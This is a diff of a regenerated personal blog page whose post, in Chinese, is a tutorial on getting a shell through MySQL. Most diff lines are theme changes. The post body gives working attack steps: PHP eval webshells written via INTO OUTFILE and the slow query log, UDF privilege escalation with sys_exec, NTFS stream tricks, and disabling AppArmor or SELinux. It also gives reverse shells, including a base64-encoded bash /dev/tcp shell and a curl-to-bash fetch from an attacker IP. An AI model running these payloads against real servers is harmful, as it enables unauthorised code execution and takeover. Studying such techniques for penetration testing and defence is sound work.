@@ -11,28 +11,36 @@
         
             通过mysql获取shell的几种方法 |
         
-        p0melo&#39;blog
+        p0melo&#39;s blog
     </title>
     
 <link rel="stylesheet" href="/css/style.css">
 
     <link rel="shortcut icon" href="/images/p0melo.svg">
     
-<link rel="stylesheet" href="/css/font-awesome.min.css">
+<link rel="stylesheet" href="/fontawesome/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/css/brands.min.css">
 
     <script id="hexo-configurations">
     let KEEP = window.KEEP || {};
     KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
-    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/p0melo.svg","favicon":"/images/p0melo.svg","article_img_align":"left","left_side_width":"300px","content_max_width":"950px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"background_img":"/images/8ad759f62321493ee2e3565c60a3632a.jpeg","description":"心之所向，素履以往，生如逆旅，一苇以航。"},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":false},"code_copy":{"enable":false,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.3"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":false},"style":{"primary_color":"#0066cc","logo":null,"favicon":"/images/p0melo.svg","avatar":"/images/p0melo.svg","font_size":null,"font_family":null,"hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/bg.svg","description":"心之所向，素履以往，生如逆旅，一苇以航。","font_color":null,"hitokoto":false},"scroll":{"progress_bar":false,"percent":false}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":false},"lazyload":{"enable":false},"comment":{"enable":true,"use":"valine","valine":{"appid":"E3140V5fTteP8KzwJweuefl2-gzGzoHsz","appkey":"Wo0PLY3dWpTTzUDW3Hbj6Gud","placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.7"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":false,"auto":false,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"left","copyright_info":true},"version":"3.5.2"};
     KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"};
   </script>
-<meta name="generator" content="Hexo 5.4.0"></head>
+<meta name="generator" content="Hexo 6.3.0"></head>
 
 
 <body>
 <div class="progress-bar-container">
-    
-        <span class="scroll-progress-bar"></span>
     
 
     
@@ -46,13 +54,14 @@
     <div class="page-main-content">
 
         <div class="page-main-content-top">
-            <header class="header-wrapper">
+            
+<header class="header-wrapper">
 
     <div class="header-content">
         <div class="left">
             
             <a class="logo-title" href="/">
-                p0melo&#39;blog
+               p0melo&#39;s blog
             </a>
         </div>
 
@@ -73,6 +82,14 @@
                                href="/archives"
                             >
                                 ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                TAGS
                             </a>
                         </li>
                     
@@ -107,6 +124,11 @@
                        href="/archives">ARCHIVES</a>
                 </li>
             
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">TAGS</a>
+                </li>
+            
         </ul>
     </div>
 
@@ -123,29 +145,39 @@
 
                 
                     <div class="fade-in-down-animation">
-    <div class="article-content-container">
+    <div class="post-page-container">
+        <div class="article-content-container">
 
-        <div class="article-title">
-            <span class="title-hover-animation">通过mysql获取shell的几种方法</span>
-        </div>
+            <div class="article-title">
+                <span class="title-hover-animation">通过mysql获取shell的几种方法</span>
+            </div>
 
-        
-            <div class="article-header">
-                <div class="avatar">
-                    <img src="/images/p0melo.svg">
-                </div>
-                <div class="info">
-                    <div class="author">
-                        <span class="name">p0melo</span>
-                        
-                            <span class="author-label">Lv2</span>
-                        
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/p0melo.svg">
                     </div>
-                    <div class="meta-info">
-                        <div class="article-meta-info">
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">p0melo</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            
+<div class="article-meta-info">
     <span class="article-date article-meta-item">
-        <i class="fas fa-edit"></i>&nbsp;2021-06-19 09:30:36
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2021-06-19 09:30:36</span>
+        <span class="mobile">2021-06-19 09:30</span>
     </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2022-09-18 20:56:08</span>
+    </span>
+    
     
     
 
@@ -155,18 +187,18 @@
     
 </div>
 
+                        </div>
                     </div>
                 </div>
-            </div>
-        
+            
 
-        <div class="article-content markdown-body">
-            <h2 id="0x01-利用outfile函数写shell"><a href="#0x01-利用outfile函数写shell" class="headerlink" title="0x01 利用outfile函数写shell"></a>0x01 利用outfile函数写shell</h2><p><strong>条件</strong></p>
+            <div class="article-content keep-markdown-body">
+                <h2 id="0x01-利用outfile函数写shell"><a href="#0x01-利用outfile函数写shell" class="headerlink" title="0x01 利用outfile函数写shell"></a>0x01 利用outfile函数写shell</h2><p><strong>条件</strong></p>
 <p>1.当前数据库用户为root权限</p>
 <p>2.secure-file-priv为空（或包含web目录）</p>
 <p>3.已知网站的绝对路径且具有写的权限</p>
 <p><strong>利用步骤</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select &#39;&lt;?php  @eval($_POST[1]);?&gt;&#39; into outfile &#39;&#x2F;var&#x2F;WWW&#x2F;shell.php&#39;;</span><br><span class="line">#当然也可以insert到表后再select 表 into outfile到php文件</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php  @eval($_POST[1]);?&gt;&#x27; into outfile &#x27;/var/WWW/shell.php&#x27;;</span><br><span class="line">#当然也可以insert到表后再select 表 into outfile到php文件</span><br></pre></td></tr></table></figure>
 
 <h2 id="0x02-利用dumpfile函数进行udf提权"><a href="#0x02-利用dumpfile函数进行udf提权" class="headerlink" title="0x02 利用dumpfile函数进行udf提权"></a>0x02 利用dumpfile函数进行udf提权</h2><p><strong>条件</strong></p>
 <p>1.root权限执行的Mysql</p>
@@ -176,8 +208,8 @@
 <p>从sqlmap或msf选择适合目标系统的udf脚本，保存解码并hex后的文件内容（解码步骤参考<a href="#%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96%E8%AF%A5udf.dll(.so)%E6%96%87%E4%BB%B6%E7%9A%8416%E8%BF%9B%E5%88%B6%E5%80%BC(hex)">小知识点</a>)）</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%plugin%&#x27;</span>; #查看udf允许的目录</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------+------------------------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name                 <span class="operator">|</span> <span class="keyword">Value</span>                  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------+------------------------+</span></span><br><span class="line"><span class="operator">|</span> default_authentication_plugin <span class="operator">|</span> mysql_native_password  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> plugin_dir                    <span class="operator">|</span> <span class="operator">/</span>usr<span class="operator">/</span>lib<span class="operator">/</span>mysql<span class="operator">/</span>plugin<span class="operator">/</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------+------------------------+</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> unhex(<span class="string">&#x27;udf.so hex code&#x27;</span>) <span class="keyword">into</span> dumpfile <span class="string">&#x27;/usr/lib/mysql/plugin/shell.so&#x27;</span>; #windows为dll，linux为so文件</span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.01</span> sec)</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">create</span> <span class="keyword">function</span> sys_exec <span class="keyword">returns</span> string soname <span class="string">&#x27;shell.so&#x27;</span>; #这里的so文件不能加绝对路径</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line">mysql<span class="operator">&gt;</span> use mysql;</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> func; #查看已创建的用户自定义函数</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+------------+----------+</span></span><br><span class="line"><span class="operator">|</span> name     <span class="operator">|</span> ret <span class="operator">|</span> dl         <span class="operator">|</span> type     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+------------+----------+</span></span><br><span class="line"><span class="operator">|</span> sys_exec <span class="operator">|</span>   <span class="number">0</span> <span class="operator">|</span> shell.so   <span class="operator">|</span> <span class="keyword">function</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+------------+----------+</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> sys_exec(<span class="string">&#x27;whoami&#x27;</span>); #返回<span class="keyword">NULL</span>说明执行成功了，这里使用的sqlmap自带的udf脚本是不带回显的</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> sys_exec(<span class="string">&#x27;whoami&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">NULL</span>               <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br></pre></td></tr></table></figure>
 
-<p>当lib/plugin目录不存在时可以使用NTFS ADS流创建lib、plugin文件夹（windows）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select @@basedir;   &#x2F;&#x2F;查找mysql的目录</span><br><span class="line">select &#39;It is dll&#39; into dumpfile &#39;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION&#39;;    &#x2F;&#x2F;使用NTFS ADS流创建lib目录</span><br><span class="line">select &#39;It is dll&#39; into dumpfile &#39;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION&#39;; &#x2F;&#x2F;利用NTFS ADS再次创建plugin目录</span><br><span class="line">执行成功以后再进行导出即可。</span><br></pre></td></tr></table></figure>
+<p>当lib&#x2F;plugin目录不存在时可以使用NTFS ADS流创建lib、plugin文件夹（windows）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select @@basedir;   //查找mysql的目录</span><br><span class="line">select &#x27;It is dll&#x27; into dumpfile &#x27;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION&#x27;;    //使用NTFS ADS流创建lib目录</span><br><span class="line">select &#x27;It is dll&#x27; into dumpfile &#x27;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION&#x27;; //利用NTFS ADS再次创建plugin目录</span><br><span class="line">执行成功以后再进行导出即可。</span><br></pre></td></tr></table></figure>
 
 <p><strong>mysql仅对本地开放端口的情况</strong></p>
 <p>1.上传有web页面版的<a class="link"   target="_blank" rel="noopener" href="https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php" >udf.php<i class="fas fa-external-link-alt"></i></a>进行提权</p>
@@ -189,12 +221,12 @@
 <li><p>受到secure_file_priv的目录限制，该默认目录与udf插件的目录不一样，导致dumpfile失败</p>
 <img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210131221223977.png" class="" title="image-20210131221223977">
 
-<p>通过修改/etc/mysql/mysql.conf.d/mysqld.cnf文件secure_file_priv为空</p>
+<p>通过修改&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf文件secure_file_priv为空</p>
 </li>
 <li><p>没有写的权限</p>
 <img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210131221824261.png" class="" title="image-20210131221824261">
 
-<p>unbutu通过<code>service apparmor teardown</code>关闭apparmor安全模式，并设置/usr/lib/mysql/plugin权限为777</p>
+<p>unbutu通过<code>service apparmor teardown</code>关闭apparmor安全模式，并设置&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin权限为777</p>
 <img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210131223336103.png" class="" title="image-20210131223336103"></li>
 </ol>
 <p>若是centos ，修改<code>/etc/sysconfig/selinux</code>文件<code>SELINUX=disabled</code>来禁用安全模式</p>
@@ -212,7 +244,7 @@
 <p>1.root权限执行的Mysql</p>
 <p>2.网站的绝对路径且具有写入权限</p>
 <p><strong>利用步骤</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#39;%slow_query_log%&#39;; #查看慢查询日志开启情况</span><br><span class="line">set global slow_query_log&#x3D;1; #开启慢查询日志</span><br><span class="line">set global slow_query_log_file&#x3D;&#39;&#x2F;var&#x2F;WWW&#x2F;shell.php&#39;; #修改日志文件存储的绝对路径</span><br><span class="line">select &#39;&lt;?php @eval($_POST[1]);?&gt;&#39; or sleep(11); #向日志文件中写入shell</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%slow_query_log%&#x27;; #查看慢查询日志开启情况</span><br><span class="line">set global slow_query_log=1; #开启慢查询日志</span><br><span class="line">set global slow_query_log_file=&#x27;/var/WWW/shell.php&#x27;; #修改日志文件存储的绝对路径</span><br><span class="line">select &#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27; or sleep(11); #向日志文件中写入shell</span><br></pre></td></tr></table></figure>
 
 <h2 id="0x05-利用system函数反弹shell"><a href="#0x05-利用system函数反弹shell" class="headerlink" title="0x05 利用system函数反弹shell"></a>0x05 利用system函数反弹shell</h2><p>mysql在5.7版本之后自带有个system函数，可以直接执行命令</p>
 <img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210620180803889.png" class="" title="image-20210620180803889">
@@ -220,7 +252,7 @@
 <p><strong>条件</strong></p>
 <p>1.mysql版本大于5.7</p>
 <p><strong>利用步骤</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#base64编码后反弹</span><br><span class="line">system bash -c &#39;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExMi4xNDIvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;;</span><br><span class="line">#利用curl访问攻击者web服务器，shell.html内容为bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</span><br><span class="line">system curl 192.168.112.142&#x2F;shell.html|bash;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#base64编码后反弹</span><br><span class="line">system bash -c &#x27;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExMi4xNDIvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;;</span><br><span class="line">#利用curl访问攻击者web服务器，shell.html内容为bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br><span class="line">system curl 192.168.112.142/shell.html|bash;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
 
 <h2 id="0x06-小知识点"><a href="#0x06-小知识点" class="headerlink" title="0x06 小知识点"></a>0x06 小知识点</h2><h3 id="secure-file-priv在不同mysql版本的区别"><a href="#secure-file-priv在不同mysql版本的区别" class="headerlink" title="secure_file_priv在不同mysql版本的区别"></a><strong>secure_file_priv在不同mysql版本的区别</strong></h3><p>mysql5.5之前secure_file_priv默认是空，这个情况可以让任何绝对路径写文件，</p>
 <p>mysql5.5-5.7，secure_file_priv默认是NULL，限制mysqld 不允许导入 | 导出，</p>
@@ -245,101 +277,126 @@
 <p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39872872/article/details/112589789" >写入mysql_通过MySQL写入webshell的几种方式<i class="fas fa-external-link-alt"></i></a></p>
 <p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/milantgh/p/5444398.html" >mysql dumpfile与outfile函数的区别<i class="fas fa-external-link-alt"></i></a></p>
 
-        </div>
+            </div>
 
-        
+            
+                <div class="post-copyright-info">
+                    <div class="article-copyright-info-container">
+    <ul class="copyright-info-content">
+        <li>
+            <span class="type">Post title</span>：<span class="content">通过mysql获取shell的几种方法</span>
+        </li>
+        <li>
+            <span class="type">Post author</span>：<span class="content">p0melo</span>
+        </li>
+        <li>
+            <span class="type">Create time</span>：<span class="content">2021-06-19 09:30:36</span>
+        </li>
+        <li class="post-link">
+            <span class="type">Post link</span>：<span class="content">2021/06/19/通过mysql获取shell的几种方法/</span>
+        </li>
+        <li>
+            <span class="type">Copyright Notice</span>：<span class="content">All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.</span>
+        </li>
+    </ul>
+</div>
 
-        
-            <div class="article-nav">
-                
-                    <div class="article-prev">
-                        <a class="prev"
-                           rel="prev"
-                           href="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/"
-                        >
+                </div>
+            
+
+            
+
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                               rel="prev"
+                               href="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/"
+                            >
                             <span class="left arrow-icon flex-center">
                               <i class="fas fa-chevron-left"></i>
                             </span>
-                            <span class="title flex-center">
+                                <span class="title flex-center">
                                 <span class="post-nav-title-item">suid提权学习</span>
                                 <span class="post-nav-item">Prev posts</span>
                             </span>
-                        </a>
-                    </div>
-                
-                
-            </div>
-        
+                            </a>
+                        </div>
+                    
+                    
+                </div>
+            
 
-        
-            <div class="comment-container">
-                <div class="comments-container">
-    <div id="comment-anchor"></div>
+            
+                <div class="comment-container">
+                    
+<div class="comments-container">
+    <div id="comments-anchor"></div>
     <div class="comment-area-title">
-        <i class="fas fa-comments">&nbsp;Comments</i>
+        <i class="fas fa-comments"></i>&nbsp;Comments
     </div>
     
-
         
             
+
     <div class="valine-container">
-        <script 
-                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <script  src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
         <div id="vcomments"></div>
         <script >
-            function loadValine() {
-                new Valine({
-                    el: '#vcomments',
-                    appId: 'E3140V5fTteP8KzwJweuefl2-gzGzoHsz',
-                    appKey: 'Wo0PLY3dWpTTzUDW3Hbj6Gud',
-                    meta: ['nick', 'mail', 'link'],
-                    avatar: 'wavatar',
-                    enableQQ: true,
-                    placeholder: '欢迎吐槽~',
-                    lang: 'en'.toLowerCase()
-                });
+          function loadValine() {
+            new Valine({
+              el: '#vcomments',
+              appId: 'E3140V5fTteP8KzwJweuefl2-gzGzoHsz',
+              appKey: 'Wo0PLY3dWpTTzUDW3Hbj6Gud',
+              meta: ['nick', 'mail', 'link'],
+              avatar: 'wavatar',
+              enableQQ: true,
+              placeholder: '',
+              lang: 'en'.toLowerCase()
+            });
 
-                function getAuthor(language) {
-                    switch (language) {
-                        case 'en':
-                            return 'Author';
-                        case 'zh-CN':
-                            return '博主';
-                        default:
-                            return 'Master';
+            function getAuthor(language) {
+              switch (language) {
+                case 'en':
+                  return 'Author';
+                case 'zh-CN':
+                  return '博主';
+                default:
+                  return 'Master';
+              }
+            }
+
+            // Add "Author" identify
+            const getValineDomTimer = setInterval(() => {
+              const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
+              if (vcards.length > 0) {
+                let author = 'p0melo';
+
+                if (author) {
+                  for (let vcard of vcards) {
+                    const vnick_dom = vcard.querySelector('.vhead .vnick');
+                    const vnick = vnick_dom.innerHTML;
+                    if (vnick === author) {
+                      vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
                     }
+                  }
                 }
+                clearInterval(getValineDomTimer);
+              } else {
+                clearInterval(getValineDomTimer);
+              }
+            }, 2000);
+          }
 
-                // Add "Author" identify
-                const getValineDomTimer = setInterval(() => {
-                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
-                    if (vcards.length > 0) {
-                        let author = 'p0melo';
-
-                        if (author) {
-                            for (let vcard of vcards) {
-                                const vnick_dom = vcard.querySelector('.vhead .vnick');
-                                const vnick = vnick_dom.innerHTML;
-                                if (vnick === author) {
-                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
-                                }
-                            }
-                        }
-                        clearInterval(getValineDomTimer);
-                    } else {
-                        clearInterval(getValineDomTimer);
-                    }
-                }, 2000);
-            }
-
-            if ('false') {
-                const loadValineTimeout = setTimeout(() => {
-                    loadValine();
-                    clearTimeout(loadValineTimeout);
-                }, 1000);
-            } else {
-                window.addEventListener('DOMContentLoaded', loadValine);
-            }
+          if ('false' === 'true') {
+            const loadValineTimeout = setTimeout(() => {
+              loadValine();
+              clearTimeout(loadValineTimeout);
+            }, 1000);
+          } else {
+            window.addEventListener('DOMContentLoaded', loadValine);
+          }
         </script>
     </div>
 
@@ -347,6 +404,18 @@
 
         
     
+</div>
+
+                </div>
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%88%A9%E7%94%A8outfile%E5%87%BD%E6%95%B0%E5%86%99shell"><span class="nav-text">0x01 利用outfile函数写shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E5%88%A9%E7%94%A8dumpfile%E5%87%BD%E6%95%B0%E8%BF%9B%E8%A1%8Cudf%E6%8F%90%E6%9D%83"><span class="nav-text">0x02 利用dumpfile函数进行udf提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%BC%80%E5%90%AF%E5%85%A8%E5%B1%80%E6%97%A5%E5%BF%97%E5%86%99%E5%85%A5shell"><span class="nav-text">0x03 开启全局日志写入shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%BC%80%E5%90%AF%E6%85%A2%E6%9F%A5%E8%AF%A2%E6%97%A5%E5%BF%97%E5%86%99%E5%85%A5shell"><span class="nav-text">0x04 开启慢查询日志写入shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E5%88%A9%E7%94%A8system%E5%87%BD%E6%95%B0%E5%8F%8D%E5%BC%B9shell"><span class="nav-text">0x05 利用system函数反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="nav-text">0x06 小知识点</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#secure-file-priv%E5%9C%A8%E4%B8%8D%E5%90%8Cmysql%E7%89%88%E6%9C%AC%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-text">secure_file_priv在不同mysql版本的区别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96%E8%AF%A5udf-dll-so-%E6%96%87%E4%BB%B6%E7%9A%8416%E8%BF%9B%E5%88%B6%E5%80%BC-hex"><span class="nav-text">如何获取该udf.dll(.so)文件的16进制值(hex)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sqlmap%E7%9A%84udf-dll-so-%E6%98%AF%E9%80%9A%E8%BF%87%E5%BC%82%E6%88%96%E7%BC%96%E7%A0%81%E7%9A%84%EF%BC%8C%E4%BD%BF%E7%94%A8%E4%B9%8B%E5%89%8D%E9%9C%80%E8%A6%81%E8%A7%A3%E7%A0%81"><span class="nav-text">sqlmap的udf.dll(.so)是通过异或编码的，使用之前需要解码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dumpfile%E5%92%8Coutfile%E6%9C%89%E4%BB%80%E4%B9%88%E4%B8%8D%E4%B8%80%E6%A0%B7"><span class="nav-text">dumpfile和outfile有什么不一样</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-text">参考</span></a></li></ol>
+    </div>
 </div>
 
             </div>
@@ -361,19 +430,25 @@
         </div>
 
         <div class="page-main-content-bottom">
-            <footer class="footer">
+            
+<footer class="footer">
     <div class="info-container">
         <div class="copyright-info info-item">
             &copy;
             
-            2023&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">p0melo</a>
+                <span>2020</span> -
+            
+            2023
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">p0melo</a>
+            
         </div>
         
-		<!--
         <div class="theme-info info-item">
-            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.5.2</a>
         </div>
-		-->
+        
         
     </div>
 </footer>
@@ -387,15 +462,16 @@
     <ul class="tools-list">
         <!-- TOC aside toggle -->
         
-            <li class="tools-item page-aside-toggle">
-                <i class="fas fa-outdent"></i>
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
             </li>
         
 
         <!-- go comment -->
         
-            <li class="go-comment">
+            <li class="tools-item flex-center go-to-comments">
                 <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
             </li>
         
     </ul>
@@ -413,10 +489,6 @@
 
         <li class="tools-item tool-font-adjust-minus flex-center">
             <i class="fas fa-search-minus"></i>
-        </li>
-
-        <li class="tools-item tool-expand-width flex-center">
-            <i class="fas fa-arrows-alt-h"></i>
         </li>
 
         <li class="tools-item tool-dark-light-toggle flex-center">
@@ -447,18 +519,8 @@
 
     </div>
 
-    
-        <aside class="page-aside">
-            <div class="post-toc-wrap">
-    <div class="post-toc">
